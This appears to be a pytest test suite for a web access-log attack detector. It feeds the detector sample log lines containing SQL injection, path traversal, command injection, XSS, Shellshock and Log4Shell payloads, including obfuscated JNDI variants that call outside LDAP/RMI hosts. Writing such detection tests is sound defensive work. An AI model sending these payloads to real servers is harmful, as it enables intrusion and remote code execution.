from datetime import datetime
from pathlib import Path

import pytest

from logsentinel import Severity, analyze_web, parse_web_lines
from logsentinel.webserver import WebEvent, normalize

SAMPLE = Path(__file__).resolve().parent.parent / "samples" / "access.log"


def line(ip: str, request: str, status: int = 200, ua: str = "curl/8") -> str:
    return f'{ip} - - [25/Sep/2026:10:00:00 +0200] "{request}" {status} 512 "-" "{ua}"'


def parse(*lines: str) -> list[WebEvent]:
    return list(parse_web_lines(lines))


def rules_for(*lines: str) -> set[str]:
    return {f.rule for f in analyze_web(parse(*lines)).findings}


def test_parses_combined_format():
    events = parse(line("198.51.100.5", "GET /index.html HTTP/1.1", 200))
    assert len(events) == 1
    e = events[0]
    assert e.ip == "198.51.100.5" and e.method == "GET" and e.path == "/index.html"
    assert e.status == 200 and e.timestamp == datetime(2026, 9, 25, 10, 0, 0)


def test_ignores_non_matching_lines():
    assert parse("esto no es un log", "", "# comentario") == []


def test_handles_size_dash_and_missing_useragent():
    events = parse('203.0.113.1 - - [25/Sep/2026:10:00:00 +0200] "GET / HTTP/1.1" 304 -')
    assert events[0].size == 0 and events[0].user_agent == ""


@pytest.mark.parametrize(
    "req, rule",
    [
        ("GET /buscar?q=1%27%20OR%20%271%27=%271 HTTP/1.1", "sqli"),
        ("GET /p?id=1%20UNION%20SELECT%20pass%20FROM%20users HTTP/1.1", "sqli"),
        ("GET /dl?f=../../../../etc/passwd HTTP/1.1", "path_traversal"),
        ("GET /dl?f=..%2f..%2fetc%2fshadow HTTP/1.1", "path_traversal"),
        ("GET /api?cmd=%3Bid HTTP/1.1", "rce"),
        ("GET /s?q=%24%7Bjndi:ldap://x/a%7D HTTP/1.1", "rce"),
        ("GET /c?x=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1", "xss"),
    ],
)
def test_signatures(req, rule):
    assert rule in rules_for(line("203.0.113.9", req, 200, "sqlmap"))


def test_url_decoding_catches_encoded_payloads():
    # %27 es ' y %20 es un espacio: la carga solo se ve después de descodificar.
    assert "sqli" in rules_for(line("203.0.113.9", "GET /x?q=%27%20or%20%271%27=%271 HTTP/1.1"))


def test_normalize():
    assert normalize("/p?id=1+UNION+SELECT+1") == "/p?id=1 union select 1"
    assert normalize("/dl?f=%252e%252e%252fetc%252fpasswd") == "/dl?f=../etc/passwd"
    assert normalize("/p?id=1/**/UNION/**/SELECT/**/1") == "/p?id=1 union select 1"


@pytest.mark.parametrize(
    "req, rule",
    [
        ("GET /item?id=1+UNION+SELECT+user,pass+FROM+users HTTP/1.1", "sqli"),
        ("GET /item?id=1/**/UNION/**/SELECT/**/1 HTTP/1.1", "sqli"),
        ("GET /dl?f=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1", "path_traversal"),
        ("GET /ping?h=127.0.0.1;cat+/etc/hosts HTTP/1.1", "rce"),
        ("GET /ping?h=127.0.0.1%7Cwhoami HTTP/1.1", "rce"),
        ("GET /x?q=%24(uname%20-a) HTTP/1.1", "rce"),
    ],
)
def test_evasions_are_caught(req, rule):
    assert rule in rules_for(line("203.0.113.9", req))


def test_attack_in_user_agent():
    # Log4Shell y Shellshock suelen venir en el User-Agent con una URL normal.
    evil = line("203.0.113.9", "GET / HTTP/1.1", ua="${jndi:ldap://198.51.100.1/a}")
    findings = analyze_web(parse(evil)).findings
    assert [f.rule for f in findings] == ["rce"]
    assert "User-Agent" in findings[0].details
    assert rules_for(line("203.0.113.9", "GET /cgi-bin/x HTTP/1.1", ua="() { :; }; /bin/bash -c id")) >= {"rce"}


def test_common_user_agents_are_not_attacks():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Mobile Safari/537.36",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "curl/8.5.0",
    ]
    lines = [line(f"198.51.100.{i}", "GET /blog?q=curl+tutorial HTTP/1.1", ua=ua) for i, ua in enumerate(agents)]
    assert analyze_web(parse(*lines)).findings == []


def test_normal_traffic_has_no_findings():
    normal = [line(f"198.51.100.{i}", f"GET /blog/{i} HTTP/1.1", 200) for i in range(30)]
    assert analyze_web(parse(*normal)).findings == []


def test_sensitive_path_scanner():
    paths = ["/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/"]
    lines = [line("192.0.2.7", f"GET {p} HTTP/1.1", 404) for p in paths]
    findings = analyze_web(parse(*lines)).findings
    assert [f.rule for f in findings] == ["recon_scanner"]
    assert findings[0].severity is Severity.MEDIUM


def test_many_404s_is_path_bruteforce_not_scanner():
    lines = [line("192.0.2.8", f"GET /random/path{i} HTTP/1.1", 404) for i in range(25)]
    assert rules_for(*lines) == {"path_bruteforce"}


def test_severity_ordering_and_offending_ips():
    lines = [
        line("203.0.113.1", "GET /api?cmd=%3Bid HTTP/1.1", 500),  # crítico
        line("203.0.113.2", "GET /x?q=%27%20or%20%271%27=%271 HTTP/1.1"),  # alto
    ]
    analysis = analyze_web(parse(*lines))
    assert analysis.findings[0].severity is Severity.CRITICAL
    assert set(analysis.offending_ips()) == {"203.0.113.1", "203.0.113.2"}


def test_sample_log_end_to_end():
    events = list(parse_web_lines(SAMPLE.read_text().splitlines()))
    analysis = analyze_web(events)
    rules = {f.rule for f in analysis.findings}
    assert rules == {"rce", "sqli", "path_traversal", "recon_scanner", "path_bruteforce"}
    assert len(events) > 200
    by_ip = {(f.ip, f.rule): f for f in analysis.findings}
    assert by_ip[("203.0.113.88", "path_traversal")].count == 4  # incluida la de doble codificación
    assert ("203.0.113.70", "sqli") in by_ip  # la que va con '+'
    assert ("203.0.113.140", "rce") in by_ip  # Log4Shell en el User-Agent


@pytest.mark.parametrize(
    "ua",
    [
        "${${lower:j}ndi:ldap://203.0.113.9/a}",
        "${${::-j}${::-n}${::-d}${::-i}:rmi://203.0.113.9/a}",
        "${${env:NADA:-j}ndi${env:NADA:-:}ldap://203.0.113.9/a}",
        "${${upper:j}${upper:n}di:dns://203.0.113.9/a}",
    ],
)
def test_detects_obfuscated_log4shell(ua):
    # Las variantes ofuscadas de Log4Shell esquivan la búsqueda literal de "${jndi:".
    assert "rce" in rules_for(line("192.0.2.66", "GET / HTTP/1.1", ua=ua))


def test_vhost_combined_format_is_parsed():
    # Apache en Debian/Ubuntu escribe other_vhosts_access.log con el host delante.
    events = parse(
        'web.example:443 198.51.100.5 - - [25/Sep/2026:10:00:00 +0200] "GET /?id=1+union+select HTTP/1.1" 200 5 "-" "x"'
    )
    assert len(events) == 1 and events[0].ip == "198.51.100.5"


def test_nginx_hex_escapes_are_decoded():
    # nginx escribe las comillas de la petición como \x22 en el log.
    assert "sqli" in rules_for(line("192.0.2.1", r"GET /?q=\x22+OR+\x221\x22=\x221 HTTP/1.1"))


def test_query_strings_do_not_count_as_extra_sensitive_paths():
    lines = [line("192.0.2.2", f"GET /wp-admin?x={i} HTTP/1.1", 404) for i in range(3)]
    lines += [line("192.0.2.3", f"GET /search?q={p} HTTP/1.1") for p in ("/.env", "/.git/", "/wp-admin")]
    assert "recon_scanner" not in rules_for(*lines)
